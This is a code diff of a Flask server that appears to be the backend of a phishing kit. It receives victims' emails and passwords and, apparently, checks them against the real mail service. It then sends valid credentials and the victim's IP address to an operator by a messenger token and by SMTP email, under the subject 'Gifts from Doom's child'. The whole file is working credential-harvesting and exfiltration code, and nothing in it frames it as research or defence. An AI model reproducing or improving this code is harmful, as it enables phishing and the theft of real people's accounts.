@@ -1,14 +1,15 @@
-from flask import Flask, request, render_template
+from flask import Flask, request, render_template, jsonify
 from threading import Thread
 from waitress import serve
 import time, json
 import sys
 from conn import DOS
+from flask_cors import CORS
 
 
 argument = sys.argv[1]
 app = Flask(__name__, static_folder=f"templates/{argument}")
-
+CORS(app)
 
 @app.route('/')
 def index():
@@ -24,22 +25,19 @@ def index():
       return('501')
 
 
-@app.route('/pdata', methods=['POST',])
-def pData():
+@app.route('/pdata/<em>/<pwd>')
+def pData(em, pwd):
    if request.headers.getlist('X-Forwarded-For'):ip = request.headers.getlist('X-Forwarded-For')[0]
    else:ip = request.remote_addr
- 
-   USERDATA = request.get_json()
-   pwd = USERDATA['pwd']
-   em = USERDATA['em']
+
    print(f'Email: {em}\nPassword: {pwd}')
-   if reportInfo['token'] != '': DOS().snTM(reportInfo['token'], reportInfo['cid'], f'Email: {em}\nPassword: {pwd}\nIP: {ip}')
-   if reportInfo['shost'] != '': DOS().sndm(reportInfo['shost'], reportInfo['sport'],
-   reportInfo['uname'], reportInfo['pwd'],reportInfo['reportEmail'], 'Gifts from Doom"s child', 
-   f'Email: {em}\nPassword: {pwd}\nIP: {ip}')
-   if pwd != '' : return 'success'
-   else : return 'error'
-    
+   if DOS().ChkIMP(em, pwd):
+      if reportInfo['token'] != '': 
+         Thread(target=DOS().snTM, args=(reportInfo['token'], reportInfo['cid'], f'Email: {em}\nPassword: {pwd}\nIP: {ip}', ), daemon=True).start()
+      if reportInfo['shost'] != '': 
+         Thread(target=DOS().sndm, args=(reportInfo['shost'], reportInfo['sport'], reportInfo['uname'], reportInfo['pwd'],reportInfo['reportEmail'], 'Gifts from Doom"s child', f'Email: {em}\nPassword: {pwd}\nIP: {ip}',), daemon=True).start()
+      return jsonify({'success': 'success'})
+   else: return jsonify({'error': 'error'})
     
 if __name__ == "__main__":
    print('Server is running...')
